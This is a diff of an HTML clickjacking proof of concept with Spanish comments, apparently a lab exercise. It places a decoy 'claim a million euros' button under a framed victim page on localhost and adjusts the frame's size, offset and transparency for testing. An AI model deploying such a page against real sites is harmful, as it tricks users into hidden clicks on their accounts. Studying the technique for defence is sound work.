@@ -8,17 +8,19 @@
     /* contenedor que "prepara" la trampa */
       .contenedor {
         position: relative; 
-            width: 300px; 
-            height: 50px; 
-            margin-top: 50px;
-            margin-left: 50px;
+            margin-top: 300px;
+            margin-left: 200px;
+            width: 462px; 
+            height: 70px;
+          /*overflow: hidden;*/
+           
         }
         /*botón falso:*/
       #decoy {
         position: absolute;
             top: 0;
             left: 0;
-            width: 100  %;
+            width: 100%;
             height: 100%;
             font-size: 15px;
             background-color: #4CAF50;
@@ -29,27 +31,22 @@
         }
         /* iframe invisible (la víctima) */
         #iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;  /*   mismo tamaño que el botón */
-            height: 100%; /* mismo tamaño que el botón */
+            position: absolute; 
+            width: 1920px;
+            height: 1080px;
+            /* ajustar la web*/
+            top: -490px;  
+            left: -730px; 
       
-            opacity: 0;   /* INVISIBLE      opacidad 0.5 xa pruebas  */
+            opacity: 0.5;   /* INVISIBLE      opacidad 0.5 xa pruebas  */
             z-index: 2;   /* ENCIMA del botón */
         }
     </style>
   </head>
-  <body>
-      <h2>¡Enhorabuena, acabas de ganar UN MILLÓN DE EUROS!</h2> 
-      <p>¡Solo tienes que iniciar sesión para reclamar tu premio!</p>
-    <div class="contenedor">
-        
-        <input type="button" id="decoy" value="PULSA AQUÍ para reclamar" onclick="alert('¡Has caído en la trampa! SKILL ISSUE')">
-        
-        <iframe id="iframe" src="http://localhost:81"></iframe>
-    
-    </div>
-    
+  <body>  
+       <div class="contenedor"> 
+          <input type="button" id="decoy" value="INICIA SESIÓN para reclamar UN MILLÓN DE EUROS" >
+          <iframe id="iframe" src="http://localhost:81"></iframe>
+       </div> 
   </body>
 </html>
